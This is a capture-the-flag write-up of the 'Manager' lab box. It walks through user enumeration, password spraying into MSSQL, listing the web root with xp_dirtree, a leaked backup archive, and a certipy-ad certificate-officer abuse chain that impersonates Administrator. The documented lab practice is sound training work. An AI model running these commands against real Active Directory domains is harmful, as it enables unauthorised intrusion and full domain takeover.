# Manager (Medium)

Password spraying into MSSQL, a website backup archive leaking credentials, and an AD CS certificate-officer abuse chain to Administrator.

## Enumeration

```bash
nmap -sC -sV <target>
```

```
53/tcp   open domain
80/tcp   open http          Microsoft IIS 10.0 — "Manager"
88/tcp   open kerberos-sec  (Domain: manager.htb)
135/tcp  open msrpc
139/tcp  open netbios-ssn
389/tcp  open ldap          (cert CN=dc01.manager.htb)
445/tcp  open microsoft-ds?
464/tcp  open kpasswd5?
593/tcp  open ncacn_http
636/tcp  open ssl/ldap
1433/tcp open ms-sql-s      Microsoft SQL Server 2019
3268/tcp open ldap
3269/tcp open ssl/ldap
```

## Foothold — Kerbrute enum → password spray → MSSQL web-root dump

```bash
kerbrute userenum -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc <target>
crackmapexec smb <target> -u users.txt -p passwords.txt
```

A hit was found (redacted — `<REDACTED>`), granting MSSQL access:

```bash
impacket-mssqlclient manager.htb/<user>:<REDACTED>@<target> -port 1433 -windows-auth
```

Using `xp_dirtree`, the IIS web root was listed and a stray backup archive discovered:

```sql
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

```bash
wget <target>/website-backup-27-07-23-old.zip
```

Inside, an `.old-conf.xml` file contained another account's plaintext credentials (redacted).

## Privilege Escalation — AD CS: adding a Certificate Manager officer

```powershell
.\Certify.exe find /vulnerable
```

Rather than a vulnerable template, this box's path involved the newly-obtained account having rights to manage the CA itself. From the attacker machine, using `certipy-ad`:

```bash
certipy-ad ca -ca manager-DC01-CA -add-officer <user> -username <user>@manager.htb -password '<REDACTED>'
certipy-ad ca -ca manager-DC01-CA -enable-template SubCA -username <user>@manager.htb -password '<REDACTED>'
certipy-ad req -username '<user>@manager.htb' -password '<REDACTED>' -ca 'manager-DC01-CA' -target 'manager.htb' -template SubCA -upn 'administrator@manager.htb'
certipy-ad ca -ca 'manager-DC01-CA' -issue-request <id> -username <user>@manager.htb -password '<REDACTED>'
certipy-ad req -username '<user>@manager.htb' -password '<REDACTED>' -ca 'manager-DC01-CA' -target manager.htb -retrieve <id>
certipy-ad auth -pfx administrator.pfx -username administrator -domain manager.htb -dc-ip <target>
```

→ Administrator NTLM hash recovered (redacted).

```bash
evil-winrm -i <target> -u administrator -H <REDACTED>
```

## Takeaways

- `xp_dirtree` against the live web root is a quick way to find stray backups accidentally left inside `wwwroot`.
- Being granted "Certificate Manager" / officer rights on a CA — even without a vulnerable template — lets an attacker enable a disabled template (like the built-in `SubCA`) and issue an arbitrary certificate, impersonating any principal including Administrator.
